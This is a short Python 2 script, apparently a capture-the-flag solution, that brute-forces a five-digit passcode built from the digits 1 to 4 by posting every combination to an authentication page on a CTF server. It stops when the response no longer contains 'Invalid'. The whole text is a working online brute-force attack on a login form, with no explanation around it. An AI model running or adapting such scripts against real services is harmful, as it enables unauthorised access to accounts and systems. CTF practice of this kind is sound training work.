import requests
import re

passset = "1234"

for p1 in passset:
    for p2 in passset:
        for p3 in passset:
            for p4 in passset:
                for p5 in passset:
                    passcode = p1+p2+p3+p4+p5;
                    r = requests.post("http://ctf4.isecureplayground.xyz:8000/passcode/authen.php", data={"passcode": passcode})
                    m = re.search("Invalid", r.content)
                    print  passcode
                    if not m :
                        print "[DONE] " + passcode
                        exit()
